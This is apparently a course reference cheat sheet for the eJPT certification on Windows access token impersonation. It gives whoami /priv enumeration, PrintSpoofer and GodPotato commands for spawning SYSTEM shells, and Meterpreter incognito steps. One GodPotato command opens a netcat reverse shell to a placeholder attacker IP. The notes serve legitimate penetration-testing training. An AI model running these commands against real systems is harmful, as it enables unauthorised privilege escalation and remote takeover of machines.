# Access Token Impersonation

In Windows, Access Tokens define the security context of a process or thread. If an attacker account possesses specific privileges, they can capture and impersonate a token belonging to a higher-privileged user (usually `NT AUTHORITY\SYSTEM`).

Used on: **eJPT / Course Reference**

## 1. Enumeration

Check the current user's privileges:
<!-- cmd: windows -->
```cmd
whoami /priv
```

Look for the following vulnerable privileges:
- `SeImpersonatePrivilege` (Commonly held by service accounts like `IIS APPPOOL\DefaultAppPool` or `NETWORK SERVICE`).
- `SeAssignPrimaryTokenPrivilege`
- `SeTcbPrivilege`

## 2. Exploitation Tools

If `SeImpersonatePrivilege` is enabled, several tools can force a `SYSTEM` process to authenticate to a rogue named pipe, capture the token, and use it to spawn an elevated shell.

### PrintSpoofer
Abuses the Print Spooler service. Excellent for modern Windows versions.
<!-- cmd: windows -->
```cmd
PrintSpoofer64.exe -i -c cmd.exe
```

### GodPotato / JuicyPotato
Abuses DCOM activations. JuicyPotato is primarily for older OS versions; GodPotato targets newer Windows versions.
<!-- cmd: windows -->
```cmd
GodPotato-NET4.exe -cmd "cmd.exe /c C:\Temp\nc.exe <ATTACKER_IP> 4444 -e cmd.exe"
```

### RoguePotato
Useful when `SeImpersonatePrivilege` is present but standard DCOM/RPC methods are heavily restricted.

## 3. Metasploit (Incognito)

If you have a Meterpreter session running with `SeImpersonatePrivilege`:

<!-- cmd: linux -->
```bash
# Load the incognito extension
load incognito

# List available tokens
list_tokens -u

# Impersonate the SYSTEM token
impersonate_token "NT AUTHORITY\SYSTEM"

# Verify elevation
getuid
```
